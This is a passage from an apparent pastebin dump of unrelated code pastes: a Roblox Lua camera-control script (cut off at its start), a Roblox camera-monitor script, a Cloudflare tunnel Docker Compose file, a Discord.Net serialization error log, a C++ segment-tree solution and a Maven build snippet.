								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						elseif InteractingObject.Value.Configuration.RLRotationNegative.Value == true then
							if InteractingObject.Value.Configuration.RLRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						end	
						RLRotation += ((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)
						
					end
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.R) then
					
					if math.max(-InteractingObject.Value.Configuration.UDRotationMax.Value, UDRotation) ~= -InteractingObject.Value.Configuration.UDRotationMax.Value then
						
						if InteractingObject.Value.Configuration.UDRotationNegative.Value == false then
							if InteractingObject.Value.Configuration.UDRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						elseif InteractingObject.Value.Configuration.UDRotationNegative.Value == true then
							if InteractingObject.Value.Configuration.UDRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						end	
						UDRotation -= ((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)
						
					end
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.F) then
					
					if math.min(InteractingObject.Value.Configuration.UDRotationMax.Value, UDRotation) ~= InteractingObject.Value.Configuration.UDRotationMax.Value then
						
						if InteractingObject.Value.Configuration.UDRotationNegative.Value == false then
							if InteractingObject.Value.Configuration.UDRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						elseif InteractingObject.Value.Configuration.UDRotationNegative.Value == true then
							if InteractingObject.Value.Configuration.UDRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.UDRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						end	
						UDRotation += ((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)
						
					end
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.U) then

					InteractingObject.Value.FieldOfView.Value = math.max(InteractingObject.Value.FieldOfView.Value - 5, 1)

				elseif KeyboardInput.Value == tostring(Enum.KeyCode.J) then

					InteractingObject.Value.FieldOfView.Value += 5
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.T) then

					InteractingObject.Value:PivotTo(CameraCFrame.Value)
					RLRotation = 0
					UDRotation = 0
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.W) then
					
					if InteractingObject.Value.Configuration.TripodCanMove.Value == true then
						InteractingObject.Value.Parent:PivotTo(InteractingObject.Value.Parent:GetPivot()*CFrame.new(InteractingObject.Value.LensPart.Value.CFrame.LookVector.X,0,InteractingObject.Value.LensPart.Value.CFrame.LookVector.Z))
					end
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.A) then
					
					if InteractingObject.Value.Configuration.TripodCanMove.Value == true then
						InteractingObject.Value.Parent:PivotTo(InteractingObject.Value.Parent:GetPivot()*CFrame.new(-InteractingObject.Value.LensPart.Value.CFrame.RightVector.X,0,-InteractingObject.Value.LensPart.Value.CFrame.RightVector.Z))
					end
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.S) then

					if InteractingObject.Value.Configuration.TripodCanMove.Value == true then
						InteractingObject.Value.Parent:PivotTo(InteractingObject.Value.Parent:GetPivot()*CFrame.new(-InteractingObject.Value.LensPart.Value.CFrame.LookVector.X,0,-InteractingObject.Value.LensPart.Value.CFrame.LookVector.Z))
					end
					
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.D) then

					if InteractingObject.Value.Configuration.TripodCanMove.Value == true then
						InteractingObject.Value.Parent:PivotTo(InteractingObject.Value.Parent:GetPivot()*CFrame.new(InteractingObject.Value.LensPart.Value.CFrame.RightVector.X,0,InteractingObject.Value.LensPart.Value.CFrame.RightVector.Z))
					end

				end
				
			end
		
		end
	
	end
	
end)"
jg1ZLpfh,Camera Monitor Script,P_YStudio,Lua,Friday 7th of July 2023 03:03:55 PM CDT,"local VPF = script.Parent.ViewportFrame

local CamModel = script.Parent.CamModel
local Cam = Instance.new(""Camera"", VPF)
VPF.CurrentCamera = Cam
local FPS = 24

local CharactersFolder = Instance.new(""Folder"")
CharactersFolder.Name = ""Characters""
CharactersFolder.Parent = VPF

for _, Descendant in pairs(workspace:GetDescendants()) do

	if Descendant:IsA(""BasePart"") and Descendant.ClassName ~= ""Terrain"" and Descendant:FindFirstChild(""Humanoid"") == nil and Descendant:FindFirstAncestor(""Cam"") == nil then

		Descendant:Clone().Parent = VPF

	end

end

CamModel.Value.FieldOfView.Changed:Connect(function()
	
	Cam.FieldOfView = CamModel.Value.FieldOfView.Value
	
end)

while wait(1/FPS) do
	
	Cam.CFrame = CamModel.Value.LensPart.Value.CFrame
	Cam.FieldOfView = CamModel.Value.FieldOfView.Value
	
	CharactersFolder:ClearAllChildren()
	
	for _, Child in pairs(workspace:GetChildren()) do

		if Child:FindFirstChild(""Humanoid"") ~= nil then
			
			Child.Archivable = true
			Child:Clone().Parent = CharactersFolder
			
		end
		
	end
	
end"
QBsfNeWM,cftunnel-compose,techblog,YAML,Friday 7th of July 2023 03:01:38 PM CDT,"version: '3'

# service description
services:

  # cloudflare tunnel
  cloudflare-tunnel:
    image: cloudflare/cloudflared
    container_name: cloudflare-tunnel
    hostname: cloudflare-tunnel
    restart: unless-stopped
    network_mode: ""host""
    command: tunnel run
    volumes:
      - /etc/localtime:/etc/localtime:ro
      - ./config/hosts:/etc/hosts
    environment:
      - ""TUNNEL_TOKEN=${CLOUDFLARE_TUNNEL_TOKEN}""
"
qkBttYpU,Untitled,Terror_nisse,mIRC,Friday 7th of July 2023 02:48:54 PM CDT,"12:09:53 Gateway     Error handling Dispatch (GUILD_AUDIT_LOG_ENTRY_CREATE):
Newtonsoft.Json.JsonSerializationException: Error converting value ""member"" to type 'Discord.PermissionTarget'. Path '[1].type'.
 ---> System.ArgumentException: Requested value 'member' was not found.
   at Newtonsoft.Json.Utilities.EnumUtils.ParseEnum(Type enumType, NamingStrategy namingStrategy, String value, Boolean disallowNumber)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.EnsureType(JsonReader reader, Object value, CultureInfo culture, JsonContract contract, Type targetType)
   --- End of inner exception stack trace ---
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.EnsureType(JsonReader reader, Object value, CultureInfo culture, JsonContract contract, Type targetType)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateValueInternal(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.SetPropertyValue(JsonProperty property, JsonConverter propertyConverter, JsonContainerContract containerContract, JsonProperty containerProperty, JsonReader reader, Object target)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.PopulateObject(Object newObject, JsonReader reader, JsonObjectContract contract, JsonProperty member, String id)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateObject(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateValueInternal(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.PopulateList(IList list, JsonReader reader, JsonArrayContract contract, JsonProperty containerProperty, String id)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateList(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, Object existingValue, String id)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateValueInternal(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.Deserialize(JsonReader reader, Type objectType, Boolean checkAdditionalContent)
   at Newtonsoft.Json.JsonSerializer.DeserializeInternal(JsonReader reader, Type objectType)
   at Newtonsoft.Json.Linq.JToken.ToObject(Type objectType, JsonSerializer jsonSerializer)
   at Discord.Rest.AuditLogHelper.CreateAuditLogEntityInfo[T](AuditLogChange[] changes, BaseDiscordClient discord)
   at Discord.WebSocket.SocketChannelDeleteAuditLogData.Create(DiscordSocketClient discord, AuditLogEntry entry)
   at Discord.WebSocket.SocketAuditLogHelper.CreateData(DiscordSocketClient discord, AuditLogEntry entry)
   at Discord.WebSocket.SocketAuditLogEntry..ctor(DiscordSocketClient discord, AuditLogCreatedEvent model)
   at Discord.WebSocket.SocketAuditLogEntry.Create(DiscordSocketClient discord, AuditLogCreatedEvent model)
   at Discord.WebSocket.DiscordSocketClient.ProcessMessageAsync(GatewayOpCode opCode, Nullable`1 seq, String type, Object payload)
12:15:55 Gateway     Serializer Error:
Newtonsoft.Json.JsonSerializationException: Error converting value ""member"" to type 'Discord.PermissionTarget'. Path 'options.type'.
 ---> System.ArgumentException: Requested value 'member' was not found.
   at Newtonsoft.Json.Utilities.EnumUtils.ParseEnum(Type enumType, NamingStrategy namingStrategy, String value, Boolean disallowNumber)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.EnsureType(JsonReader reader, Object value, CultureInfo culture, JsonContract contract, Type targetType)
   --- End of inner exception stack trace ---
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.EnsureType(JsonReader reader, Object value, CultureInfo culture, JsonContract contract, Type targetType)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateValueInternal(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.SetPropertyValue(JsonProperty property, JsonConverter propertyConverter, JsonContainerContract containerContract, JsonProperty containerProperty, JsonReader reader, Object target)
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.PopulateObject(Object newObject, JsonReader reader, JsonObjectContract contract, JsonProperty member, String id)"
zUiMNCuM,Fig trees of Hatshepsut,leoanjos,C++,Friday 7th of July 2023 02:39:00 PM CDT,"#include <bits/stdc++.h>

using namespace std;

#define llong long long int

const int MAX = 1e6 + 5;

int phi[MAX];

struct SegmentTree {
private:
    struct Node {
        llong sum;
        int equal;

        Node(llong sum = 0LL, int equal = -1): sum(sum), equal(equal) {}

        Node operator +(Node other) {
            llong nsum = sum + other.sum;
            int nequal = equal == -1 || other.equal == -1 ? -1 : (equal != other.equal ? -1 : equal);
            return Node(nsum, nequal);
        }
    };

    int n;
    vector<int> a;
    vector<int> lazy;
    vector<Node> tree;

public:
    SegmentTree(int n, vector<int> &a) {
        this->n = n;
        this->a = a;

        lazy.assign(4 * n, -1);
        tree.resize(4 * n);
        build(1, 1, n);
    }

    void update(int l, int r, int v = -1) {
        update(1, 1, n, l, r, v);
    }

    llong query(int l, int r) {
        return query(1, 1, n, l, r);
    }

private:
    void build(int node, int l, int r) {
        if (l == r) tree[node] = Node(a[l], a[l]);
        else {
            int m = (l + r) / 2;
            build(2 * node, l, m);
            build(2 * node + 1, m + 1, r);
            tree[node] = tree[2 * node] + tree[2 * node + 1];
        }
    }

    void update_lazy(int node, int l, int r, int v) {
        tree[node].sum = (r - l + 1LL) * v;
        tree[node].equal = v;
        lazy[node] = v;
    }

    void push_down(int node, int l, int r) {
        if (lazy[node] == -1) return;

        int m = (l + r) / 2;
        update_lazy(2 * node, l, m, lazy[node]);
        update_lazy(2 * node + 1, m + 1, r, lazy[node]);
        lazy[node] = -1;
    }

    void update(int node, int l, int r, int ul, int ur, int v) {
        if (r < ul || l > ur) return;
        if (ul <= l && r <= ur) {
            if (v != -1) {
                update_lazy(node, l, r, v);
                return;
            }

            if (tree[node].equal != -1) {
                update_lazy(node, l, r, phi[tree[node].equal]);
                return;
            }
        }

        push_down(node, l, r);

        int m = (l + r) / 2;
        update(2 * node, l, m, ul, ur, v);
        update(2 * node + 1, m + 1, r, ul, ur, v);
        tree[node] = tree[2 * node] + tree[2 * node + 1];
    }

    llong query(int node, int l, int r, int ql, int qr) {
        if (r < ql || l > qr) return 0LL;
        if (ql <= l && r <= qr) return tree[node].sum;

        push_down(node, l, r);

        int m = (l + r) / 2;
        return query(2 * node, l, m, ql, qr) + query(2 * node + 1, m + 1, r, ql, qr);
    }
};

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);

    for (int i = 0; i < MAX; i++)
        phi[i] = i;

    for (int i = 2; i < MAX; i++)
        if (phi[i] == i)
            for (int j = i; j < MAX; j += i)
                phi[j] -= phi[j] / i;

    int n, q;
    cin >> n >> q;

    vector<int> a(n + 1);
    for (int i = 1; i <= n; i++)
        cin >> a[i];

    SegmentTree tree(n, a);
    while (q--) {
        int t, L, R;
        cin >> t >> L >> R;

        if (t == 1) tree.update(L, R);
        else if (t == 2) {
            int x; cin >> x;
            tree.update(L, R, x);
        }
        else {
            llong ans = tree.query(L, R);
            cout << ans << ""\n"";
        }
    }
}"
ku1AmErb,suporte-aluno-natanael-bonfim-jdev-outro,tadeuespindola,XML,Friday 7th of July 2023 02:18:59 PM CDT,"<build>
	<plugins>
		<plugin>
			<groupId>org.apache.maven.plugins</groupId>
			<artifactId>maven-war-plugin</artifactId>
			<version>3.3.1</version>
		</plugin>
		<plugin>
			<groupId>org.apache.maven.plugins</groupId>
			<artifactId>maven-compiler-plugin</artifactId>
			<version>3.7.0</version>
			<configuration>
				<source>8</source>
				<target>8</target>
			</configuration>
		</plugin>
	</plugins>
</build>"
